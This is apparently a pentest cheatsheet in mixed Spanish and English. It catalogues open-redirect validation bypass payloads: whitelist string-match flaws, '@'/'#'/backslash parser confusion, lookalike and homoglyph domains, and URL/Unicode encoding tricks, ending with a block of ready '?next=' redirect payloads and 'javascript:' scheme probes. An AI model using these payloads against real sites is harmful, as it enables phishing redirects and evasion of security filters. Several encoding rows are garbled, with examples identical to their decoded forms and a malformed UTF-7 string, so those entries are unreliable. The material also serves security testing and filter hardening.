---
aliases:
  - Open Redirect Filter Bypass
  - Whitelist Bypass
  - URL Parser Confusion
tags:
  - type/cheatsheet
  - vuln/open-redirect
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Open Redirect]]'
---
# Open Redirect - Bypass de Validación

***

## Whitelist Domain Match

| **Validation** | **Bypass payload** | **Notas** |
|:---:|:---:|:---:|
| `startsWith("https://target.com")` | `https://target.com.attacker.com` | Suffix attacker. |
| `endsWith("target.com")` | `https://attacker-target.com` | Prefix attacker. |
| `contains("target.com")` | `https://attacker.com/?x=target.com` | Substring anywhere. |
| Regex `target\.com` (sin anchor) | `https://attacker.com/target.com.html` | No `^$` anchors. |
| Regex `^https://target\.com` (sin terminator) | `https://target.com.attacker.com` | Sufijo. |
| Regex `target\.com$` | `https://target.com@attacker.com` | userinfo + suffix legit. |
| `parseUrl(input).host == "target.com"` con buggy parser | `https://target.com@attacker.com` | Some parsers parsean wrong. |
| Substring `target.com` | `https://attackertarget.com` | Composed domain. |
| `.endsWith("target.com")` | `https://eviltarget.com` | Eviltarget owns it. |
| Allowlist con subdomain wildcard | `https://attacker.target.com.evil.com` | Subdomain prefix abuse. |
| Validation strip protocol | `target.com\\@attacker.com` | After strip → ambiguous. |
| Validation only HTTP/HTTPS | `javascript:alert(1)` | Skip http/https check. |
| Validation only blacklist scheme | `Vbscript:msgbox(1)` | Less common scheme. |
| Lowercase only | `HtTpS://target.com.evil.com` | Case bypass del filter. |
^or-bypass-whitelist

___

## URL Parser Confusion (`@`, `#`, `?`)

| **Payload** | **Resultado parsing** | **Notas** |
|:---:|:---:|:---:|
| `https://target.com@attacker.com` | Userinfo `target.com`, host `attacker.com` | Standard userinfo. |
| `https://target.com:80@attacker.com` | Userinfo con port-like | Same idea. |
| `https://attacker.com#@target.com` | Host `attacker.com`, fragment `@target.com` | Fragment confusion. |
| `https://attacker.com#target.com` | Fragment de target.com | Browser navigates to attacker. |
| `https://attacker.com?target.com` | Query `target.com` | Same as fragment. |
| `https://attacker.com\\@target.com` | Backslash split before @ | Some parsers. |
| `https://target.com\@attacker.com` | Backslash before @ | Inconsistent parsing. |
| `https://target.com.attacker.com#@target.com` | Multi-trick | Combine. |
| `https://target.com.@attacker.com` | Trailing dot before @ | DNS root. |
| `//target.com:@attacker.com` | Empty password trick | Same as userinfo. |
| `https://attacker.com/.target.com` | Path includes target | Whitelist substring. |
| URL-encoded `@` | `https://target.com%40attacker.com` | After decode = `@`. |
| Doble URL-encoded `@` | `https://target.com%2540attacker.com` | Multi-decode parsers. |
| `https://target.com@attacker.com` | Unicode escape | If parser lo procesa. |
^or-bypass-parser

### URL parser inconsistencies

| Component | Browser parses as | Backend parses as |
|---|---|---|
| `https://a@b/path` | host=b | varies — some treat as `a` host |
| `https://a/b@c` | host=a, path=`/b@c` | varies |
| `https://a\\b` | varies — Chrome=a, FF=path `\\b` | varies |
| `https://a#b@c` | host=a, fragment `b@c` | varies — some strip fragment first |

___

## Subdomain Prefix/Suffix Abuse

| **Validation** | **Bypass** | **Notas** |
|:---:|:---:|:---:|
| `*.target.com` allowed | Atacante registra subdomain | Exact wildcard match. |
| `target.com.attacker.com` | Suffix de attacker | Common bypass. |
| `attacker-target.com` | Atacante registra similar TLD | Lookalike domain. |
| `xn--target-...` | IDN homoglyph | Cyrillic chars. |
| `target.com.` (trailing dot) | DNS root indication | Some parsers. |
| `target.attacker.com` | Subdomain de atacante | Subdomain abuse. |
| `tаrget.com` (Cyrillic а) | IDN spoofing | Visual identical. |
| `target.com@attacker.com` | Userinfo trick | See Parser Confusion. |
| `attacker.com/target.com` | Path includes target | Substring filter. |
| `target.com.evil.com` con `.evil.com` whitelist | Suffix bypass | Whitelist mal config. |
| `target.com#.attacker.com` | Fragment trick | Hash as separator. |
| `subdomain.target.com.attacker.com` | Multi-segment trick | Compound. |
| `target.com.localhost` | Local TLD | `.localhost` abuse. |
^or-bypass-subdomain

___

## Encoding Tricks (URL / Unicode)

| **Encoding** | **Payload** | **Decoded** |
|:---:|:---:|:---:|
| URL-encoded slash | `%2F%2Fattacker.com` | `//attacker.com` |
| Doble URL-encoded slash | `%252F%252Fattacker.com` | (after double decode) `//attacker.com` |
| URL-encoded protocol | `https%3A%2F%2Fattacker.com` | `https://attacker.com` |
| Mixed encoded | `https:%2F%2Fattacker.com` | `https://attacker.com` |
| URL-encoded backslash | `%5C%5Cattacker.com` | `\\attacker.com` |
| Unicode encoded slash | `//attacker.com` | `//attacker.com` (in JSON contexts). |
| UTF-7 encoded | `+ADwAaAB0AHQAcA==://...` | UTF-7 decoded URL. |
| Punycode IDN | `xn--ttacker-...` | Visual lookalike domain. |
| Unicode normalization | `target.com` (visual) → `target.com` (NFC) | Lookalike chars. |
| Hex encoded | `\x68\x74\x74\x70\x73://attacker.com` | If reflected en JS. |
| Base64 (in custom contexts) | `aHR0cHM6Ly9hdHRhY2tlci5jb20=` | Decoded URL. |
| Mixed case scheme | `hTtPs://attacker.com` | Case-insensitive scheme. |
| Whitespace tricks | `https://attacker.com %20` | Trailing space. |
| Tabs | `https://attacker.com\t` | Trailing tab. |
| Right-to-left override | `‮attacker.com` | Visual spoofing. |
^or-bypass-encoding

### Combinaciones útiles

```
# Bypass multi-layer:
?next=//target.com.attacker.com         # Suffix + protocol-relative
?next=https://target.com@attacker.com   # Userinfo trick
?next=//attacker.com\@target.com        # Backslash + @ confusion
?next=javascript%3Aalert(1)             # URL-encoded scheme
?next=//attacker.com%23target.com       # Encoded fragment
?next=%2F%2Fattacker.com%3Ftarget.com   # Multi-encoded
?next=//attacker%2Ecom                  # Encoded dot in domain
?next=//xn--ttacker-...                 # Punycode IDN
```

***
